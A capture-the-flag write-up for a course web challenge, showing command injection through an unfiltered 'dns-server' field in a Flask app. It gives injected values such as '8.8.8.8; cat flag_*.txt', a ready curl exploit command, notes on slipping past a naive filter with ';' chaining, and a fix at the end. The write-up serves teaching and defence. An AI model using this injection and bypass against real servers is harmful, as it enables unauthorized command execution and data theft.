---
title: "Network check — command injection"
category: Web
host: cmd.is-course.ru
points: 100
tags: [command-injection, waf-bypass, python-flask]
technique: "unfiltered `dns-server` concatenated into a shell command"
status: solved
---

# Network check

## TL;DR
The "check my ping / ip / country / city" buttons post a **hidden field** `command` to `/`, which the
backend runs through a shell. `command` itself is whitelisted, but the sibling field `dns-server` is
concatenated into the curl invocation verbatim:

```
$ curl ifconfig.co/ip --dns-servers 8.8.8.8; id
uid=2000(solver) gid=2000(solver) groups=2000(solver)
```

## Recon
`GET /` is a four-form page; every form ships its "command" as a hidden input, which is the first smell:
the *client* dictates the command line. Posting an arbitrary `command` returns `command rejected`
(exact-string allowlist), so the injection point has to be one of the other parameters.

The two `curl` forms also submit `dns-server`. Changing it to `8.8.8.8; id` executes `id`.

## Exploitation
```bash
curl -s https://cmd.is-course.ru/ \
  --data-urlencode 'command=curl ifconfig.co/ip' \
  --data-urlencode 'dns-server=8.8.8.8; cat flag_*.txt'
```
```
YDS{…redacted…}
```

The working directory is `/home/app` (not `/app`) and contains `app.py`, `start.sh` and
`flag_<md5>.txt` — the flag file is renamed per instance, so use a glob:

```
$ pwd; ls -la
/home/app
-r--r--r-- 1 root root 2969 app.py
-r--r--r-- 1 root root   69 flag_525d1d0910b9675d8fb77881b55aa729.txt
-r-xr-xr-x 1 root root  549 start.sh
```

Verified live: `ls /app` returns *No such file or directory*, which is a useful reminder that writeups
must be re-run, not remembered.

## Notes on the filter
A naive WAF rejects `$(...)` with `HACKING DETECTED` and backticks likewise, but plain `;`
command chaining goes straight through. `command` is checked against an allowlist of the four
literal strings from the HTML, so **always test the parameters the UI does not advertise**.

## Fix
Never build a shell string from request data; pass the DNS server as an argument to a subprocess
without a shell (`subprocess.run([...], shell=False)`) and validate it as an IP address.
